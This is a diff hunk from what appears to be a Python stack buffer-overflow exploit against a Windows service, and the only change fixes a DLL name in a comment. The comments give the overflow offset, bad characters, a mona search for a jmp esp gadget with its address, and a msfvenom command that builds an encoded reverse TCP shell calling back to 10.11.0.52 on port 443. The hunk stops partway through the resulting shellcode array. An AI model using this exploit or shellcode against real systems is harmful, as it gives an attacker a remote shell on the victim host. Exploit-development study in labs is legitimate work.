@@ -6,7 +6,7 @@ import socket
 #pattern : 41326941 , pattern offset match at 246
 #increase total buffer length to 600 so that "C"'s can occupy min 350 bytes of space
 #badchars = \x00 \x0a \x0d
-#We use ntpd.dll which had aslr and dep on as we did not find any app with aslr and dep off. we find its jmp esp using : !mona find -s "\xff\xe4" -m ntpd.dll. We find jmp esp at 77CAE871 which is \x71\xe8\xca\x77 in little endian for 32-bit system. Add nops.
+#We use ntdll.dll which had aslr and dep on as we did not find any app with aslr and dep off. we find its jmp esp using : !mona find -s "\xff\xe4" -m ntdll.dll. We find jmp esp at 77CAE871 which is \x71\xe8\xca\x77 in little endian for 32-bit system. Add nops.
 #shellcode = msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.52 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -o shellcode.txt
 shellcode=("\xdb\xc6\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\xbb\x6f\x2f\xd7"
 "\xc4\x31\x5a\x17\x03\x5a\x17\x83\xad\x2b\x35\x31\xcd\xdc\x3b"
